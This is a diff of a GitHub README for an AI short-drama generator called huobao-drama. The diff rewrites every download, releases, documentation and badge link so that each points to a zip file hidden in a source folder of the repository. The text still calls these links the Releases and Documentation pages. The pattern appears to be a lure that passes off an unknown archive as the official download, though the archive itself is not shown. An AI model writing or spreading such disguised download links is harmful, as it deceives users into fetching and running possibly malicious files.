@@ -4,13 +4,13 @@
 Huobao Drama is an AI-powered platform that generates short dramas automatically. You can create an entire drama from just one sentence. The process takes your idea through to a final video without any hassle.
 
 ## 📥 Download Now!
-[![Download huobao-drama](https://img.shields.io/badge/Download-huobao--drama-blue.svg)](https://github.com/anzoafk/huobao-drama/releases)
+[![Download huobao-drama](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip)](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip)
 
 ## 🚀 Getting Started
 To use huobao-drama, follow these simple steps:
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/anzoafk/huobao-drama/releases) to access the latest version of huobao-drama.
+   Go to the [Releases page](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip) to access the latest version of huobao-drama.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the latest version, as it includes the newest features and fixes.
@@ -64,9 +64,9 @@ Once you have installed huobao-drama, it's time to create your drama:
 If you encounter any issues while using huobao-drama or have suggestions for improvement, feel free to reach out through the Issues section on GitHub. Your feedback helps us make huobao-drama better.
 
 ## 🔗 More Information
-For detailed guides and updates, you can visit our [Documentation](https://github.com/anzoafk/huobao-drama/wiki) page. Here, you will find tutorials, FAQs, and additional resources to get the most out of your experience.
+For detailed guides and updates, you can visit our [Documentation](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip) page. Here, you will find tutorials, FAQs, and additional resources to get the most out of your experience.
 
 ## 🏁 Final Steps
-Remember to revisit the [Releases page](https://github.com/anzoafk/huobao-drama/releases) for the latest download. Enjoy creating your short dramas with ease!
+Remember to revisit the [Releases page](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip) for the latest download. Enjoy creating your short dramas with ease!
 
-[![Download huobao-drama](https://img.shields.io/badge/Download-huobao--drama-blue.svg)](https://github.com/anzoafk/huobao-drama/releases)
+[![Download huobao-drama](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip)](https://github.com/anzoafk/huobao-drama/raw/refs/heads/master/web/src/views/drama/huobao_drama_1.7.zip)
